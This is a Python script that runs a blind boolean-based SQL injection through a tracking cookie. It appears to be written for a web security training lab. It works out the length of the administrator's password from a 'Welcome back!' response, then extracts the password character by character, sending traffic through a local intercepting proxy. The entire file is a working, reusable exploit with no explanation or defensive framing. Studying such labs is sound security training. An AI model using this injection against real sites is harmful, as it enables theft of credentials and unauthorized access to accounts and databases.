import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"
}

def get_pass_len(url):
    payload = "' AND (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = "

    for i in range(1,30):
        injection = payload + str(i) + "-- "
        Cookie = {
            "TrackingId" : "i8mWW3GvMxGRTL34" + injection,
            "session" : "zBZZ6rtNCFIEI957MgCNLcnEaktuR9c4"
        }
        res = requests.get(url, cookies=Cookie, verify=False, proxies=proxies)
        if "Welcome back!" in res.text:
            return i
    return False

def get_admin_pass(url, pass_len):
    password = ""

    for i in range (1, pass_len+1):
        for j in range (32,127):
            payload = "' AND (SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username = 'administrator') = '%s'-- " %(i,j)
            cookie = {
                "TrackingId" : "i8mWW3GvMxGRTL34" + payload,
                "session" : "zBZZ6rtNCFIEI957MgCNLcnEaktuR9c4"
            }
            res = requests.get(url, cookies=cookie, verify=False, proxies=proxies)

            sys.stdout.write('\r' + password + chr(j))
            sys.stdout.flush()
            
            if "Welcome back!" in res.text:
                password += chr(j)
                break
    return password

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] invalid inputs")
        print("[-] %s <ul>" %sys.argv[0])
        sys.exit(-1)
    
    # find length of the password 
    pass_len = get_pass_len(url)
    print(pass_len)

    # find password of username 'administrator'
    admin_pass = get_admin_pass(url, pass_len)

